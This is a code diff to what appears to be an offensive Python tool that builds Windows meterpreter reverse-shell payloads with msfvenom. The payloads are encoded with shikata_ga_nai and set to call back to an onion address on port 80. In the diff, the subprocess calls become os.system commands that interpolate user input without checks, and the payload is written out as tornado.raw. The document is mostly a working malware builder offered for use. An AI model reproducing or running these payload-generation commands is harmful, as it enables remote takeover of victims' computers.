@@ -1,6 +1,7 @@
 import os
 import wget
 import time
+import crypt
 import shutil
 import zipfile
 import tornado
@@ -38,61 +39,19 @@ def shell(host):
     print(f"{bblue}[+]{bos} Enter arch: [x86--x64] [default: x64]")
     arch = input()
     arch = arch or "x64"
-
-    lhost = host
-    lport = 80
-
-    print(f"{bblue}[+]{bos} Iterations: [default: 2]")
-    iterations = input()
-    iterations = iterations or "2"
     
     print(f"{bblue}[+]{bos} Encryption: [default: x86/shikata_ga_nai]:")
     encryption = input()
     encryption = encryption or "x86/shikata_ga_nai"
 
-    print(f"{bblue}[+]{bos} Icon Path: [default: icons/tornado.ico]:")
-    icon_name = input()
-    icon_name = encryption or "icons/tornado.ico"
-    
     print(f"{bblue}[*]{bos} Payload: {payload}")
     print(f"{bblue}[*]{bos} Arch: {arch}")
-    print(f"{bblue}[*]{bos} Onion Adress: {lhost}:{lport}")
-    print(f"{bblue}[*]{bos} Iterations: {iterations}")
+    print(f"{bblue}[*]{bos} Onion Adress: {host}:80")
     print(f"{bblue}[*]{bos} Encryption: {encryption}")
-    print(f"{bblue}[*]{bos} Icon for Payload: {icon_name}")
-    print(f"{bblue}[+]{bos} Shell saved in local directory.")
+    print(f"{bblue}[+]{bos} Msfvenom payload creating..")
     
     if arch == "x64":
-        subprocess.run(
-            [
-                "msfvenom",
-                "-p",
-                f"windows/x64/meterpreter_reverse_{payload}",
-                f"LHOST={lhost}",
-                f"LPORT={lport}",
-                f"-i {iterations}",
-                f"-e {encryption}",
-                "--platform windows",
-                "-a x64",
-                "-f exe",
-                "-o tornado.exe"
-            ]
-        )
+        os.system(f"/usr/bin/msfvenom -p windows/x64/meterpreter_reverse_{payload} LHOST={host} LPORT=80 -e {encryption} EXITFUNC=process --platform windows -a {arch} -f raw -o tornado.raw")
 
     if arch == "x86":
-        subprocess.run(
-            [
-                "msfvenom",
-                "-p",
-                "windows/meterpreter_reverse_{payload}".format(payload),
-                "LHOST={lhost}".format(lhost),
-                "LPORT={lport}".format(lport),
-                "-i {iterations}".format(iterations),
-                "-e {encryption}".format(encryption),
-                "--platform windows",
-                "-a x86",
-                "-f exe",
-                "-o tornado.exe"
-            ]
-        )
-
+        os.system(f"msfvenom -p windows/meterpreter_reverse_{payload} LHOST={host} LPORT=80 -e {encryption} --platform windows -a x86 -f raw -o tornado.raw")
